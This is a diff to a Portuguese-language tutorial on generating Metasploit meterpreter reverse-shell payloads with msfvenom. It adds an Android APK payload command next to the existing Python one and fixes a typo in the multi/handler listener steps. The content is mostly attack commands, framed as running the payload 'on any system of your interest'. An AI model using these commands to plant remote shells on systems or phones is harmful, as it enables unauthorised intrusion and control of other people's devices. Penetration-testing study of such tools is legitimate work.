@@ -92,7 +92,6 @@ Agora que o cliente está instalado e configurado, você só precisa iniciá-lo.
 
 Para criar um payload em python é muito simples, basta digitar o comando abaixo alterando o ```LHOST``` para seu ip ou dns, caso tenha configurado, e ```LPORT``` para a porta de seu desejo.
 
-
     msfvenom -p python/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=SUA_PORTA R > payload.py
 
 Ao concluir, será gerado um código em python que poderá ser executado em qualquer sistema de seu interesse, porém, dentro deste código, existe uma parte codificada em base64, desta forma, podemos usar algum [decodificador online](https://www.base64decode.org/) para ver o que é.
@@ -100,14 +99,16 @@ Ao concluir, será gerado um código em python que poderá ser executado em qual
 #### Realizando ataque em dispositivos android
 
 
+Para criar um payload em android basta digitar o comando abaixo alterando o ```LHOST``` para seu ip ou dns, caso tenha configurado, e ```LPORT``` para a porta de seu desejo.
 
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=SUA_PORTA R > payload.apk
 
 #### Iniciar a ação
 
 Para realizar o ataque em qualquer uma das plataformas acima, basta executar os comandos abaixo:
 
 1. ```msfconsole```
-2. ```use exploite/multi/handler```
+2. ```use exploit/multi/handler```
 3. ```set PAYLOAD PLATAFORMA_ESCOLHIDA/meterpreter/reverse_tcp```
 4. ```set LHOST SEU_IP```
 5. ```set LPORT SUA_PORTA```
